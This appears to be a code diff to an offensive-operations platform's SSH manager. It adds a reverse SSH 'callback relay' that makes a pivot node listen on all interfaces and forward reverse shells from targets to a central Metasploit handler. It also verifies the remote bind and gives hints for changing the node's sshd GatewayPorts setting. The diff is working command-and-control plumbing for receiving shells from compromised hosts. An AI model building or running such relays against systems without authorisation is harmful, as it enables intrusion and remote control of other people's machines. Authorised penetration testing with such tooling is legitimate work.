@@ -133,6 +133,14 @@ class SSHManager:
 
     def __init__(self):
         self._tunnels: dict[str, Union[SSHTunnel, WGTunnel]] = {}  # node_id -> Tunnel
+        # node_id -> callback relay {process, lport, msf_host, msf_port, host,
+        # user, ssh_port, key_file}. A relay is a reverse SSH forward that makes
+        # the NODE listen on lport and hand every connection back to the central
+        # MSF handler — so a reverse shell from a target lands on our msfrpcd
+        # without the target ever opening a bind port. It rides the SSH mgmt
+        # channel, so it works for WireGuard nodes too (their WG mesh is the SOCKS
+        # egress, but mgmt/exec is still SSH — see exec_command/provision_exec).
+        self._relays: dict[str, dict] = {}
 
     async def start_tunnel(self, tunnel: Union[SSHTunnel, WGTunnel]) -> dict:
         """Start a SOCKS tunnel (SSH or WireGuard). Returns dict with ok, error details."""
@@ -142,6 +150,123 @@ class SSHManager:
             return await self._start_wg_tunnel(tunnel)
         else:
             return {"ok": False, "error": f"Unsupported tunnel type: {type(tunnel)}"}
+
+    # ── Reverse callback relay ───────────────────────────────────────────────
+
+    async def start_callback_relay(
+        self, node_id: str, host: str, user: str, ssh_port: int, key_file: str,
+        lport: int, msf_host: str, msf_port: int,
+    ) -> dict:
+        """Open a reverse SSH forward so the NODE listens on lport and relays
+        every connection back to the central MSF handler (msf_host:msf_port,
+        resolved on THIS side — node-manager is on agents_net and reaches the
+        `metasploit` container).
+
+        `ssh -R 0.0.0.0:lport:msf_host:msf_port` — the node binds 0.0.0.0 so a
+        target on its network can reach it, which needs the node's sshd to allow
+        `GatewayPorts` (yes|clientspecified). If sshd only allows localhost the
+        forward still starts but binds 127.0.0.1 — caught and reported so it does
+        not look like a working relay that silently drops every callback.
+
+        Works for SSH and WireGuard nodes alike: this is a management SSH
+        connection, independent of whichever transport carries the SOCKS proxy.
+        """
+        key_path = os.path.join(SSH_KEYS_DIR, key_file)
+        if not os.path.isfile(key_path):
+            return {"ok": False, "error": f"SSH key not found: {key_file}"}
+        await self.stop_callback_relay(node_id)  # never stack two on one node
+
+        bind = f"0.0.0.0:{lport}"
+        cmd = [
+            "ssh", "-N", "-T",
+            "-R", f"{bind}:{msf_host}:{msf_port}",
+            "-i", key_path, "-p", str(ssh_port),
+            *SSH_OPTS,
+            # If the node's sshd refuses the 0.0.0.0 bind, fail the connection
+            # rather than silently falling back to a localhost-only forward.
+            "-o", "ExitOnForwardFailure=yes",
+            f"{user}@{host}",
+        ]
+        log.info("Starting callback relay for %s: node:%d -> %s:%d", node_id, lport, msf_host, msf_port)
+        try:
+            proc = await asyncio.create_subprocess_exec(
+                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+        except Exception as e:  # noqa: BLE001
+            return {"ok": False, "error": f"could not spawn relay: {e}"}
+
+        # Give ssh a moment to connect and set up (or fail) the forward.
+        await asyncio.sleep(2)
+        if proc.returncode is not None:
+            err = ""
+            try:
+                _, stderr = await asyncio.wait_for(proc.communicate(), timeout=3)
+                err = stderr.decode(errors="replace").strip()
+            except Exception:  # noqa: BLE001
+                pass
+            hint = ""
+            if "forward" in err.lower() or "bind" in err.lower():
+                hint = (" — the node's sshd likely disallows a 0.0.0.0 remote bind; "
+                        "set `GatewayPorts clientspecified` (or yes) in its sshd_config.")
+            return {"ok": False, "error": f"relay exited immediately: {err or 'no output'}{hint}"}
+
+        # GatewayPorts downgrade check — the failure ExitOnForwardFailure does NOT
+        # catch. With `GatewayPorts no` (the sshd default) the node SILENTLY binds
+        # 127.0.0.1 instead of 0.0.0.0: the forward "succeeds", so ssh stays up,
+        # but a target can never reach node:<lport> and every callback is dropped.
+        # Confirmed live against a real node. So verify the ACTUAL bind and refuse
+        # a localhost-only relay rather than report a working one.
+        check = await self.provision_exec(
+            node_id, host, user, ssh_port, key_file,
+            f"ss -tln 2>/dev/null | grep -E ':{lport}( |$)' || "
+            f"netstat -tln 2>/dev/null | grep -E ':{lport}( |$)' || true",
+            timeout=15)
+        out = (check.get("stdout") or "")
+        wildcard = (f"0.0.0.0:{lport}" in out or f"*:{lport}" in out
+                    or f":::{lport}" in out or f"[::]:{lport}" in out)
+        if not wildcard:
+            try:
+                proc.terminate()
+            except Exception:  # noqa: BLE001
+                pass
+            saw = " ".join(out.split()) or "nothing listening"
+            return {"ok": False, "error": (
+                f"relay bound localhost-only on the node (saw: {saw[:140]}). The "
+                f"node's sshd has GatewayPorts off, so a target cannot reach "
+                f"node:{lport} and every callback would be dropped. Set "
+                f"`GatewayPorts clientspecified` (or yes) in the node's sshd_config "
+                f"and reload sshd, then start the relay again.")}
+
+        self._relays[node_id] = {
+            "process": proc, "lport": lport, "msf_host": msf_host, "msf_port": msf_port,
+            "host": host, "user": user, "ssh_port": ssh_port, "key_file": key_file,
+        }
+        return {"ok": True, "lport": lport, "msf_host": msf_host, "msf_port": msf_port,
+                "bound": "0.0.0.0"}
+
+    async def stop_callback_relay(self, node_id: str) -> dict:
+        relay = self._relays.pop(node_id, None)
+        if not relay:
+            return {"ok": True, "stopped": False}
+        proc = relay.get("process")
+        if proc and proc.returncode is None:
+            try:
+                proc.terminate()
+                await asyncio.wait_for(proc.wait(), timeout=5)
+            except Exception:  # noqa: BLE001
+                try:
+                    proc.kill()
+                except Exception:  # noqa: BLE001
+                    pass
+        return {"ok": True, "stopped": True}
+
+    def callback_relay_status(self, node_id: str) -> dict:
+        relay = self._relays.get(node_id)
+        if not relay:
+            return {"active": False}
+        proc = relay.get("process")
+        alive = bool(proc and proc.returncode is None)
+        return {"active": alive, "lport": relay.get("lport"),
+                "msf_host": relay.get("msf_host"), "msf_port": relay.get("msf_port")}
 
     async def _start_ssh_tunnel(self, tunnel: SSHTunnel) -> dict:
         """Start an autossh SOCKS tunnel. Returns dict with ok, error details."""
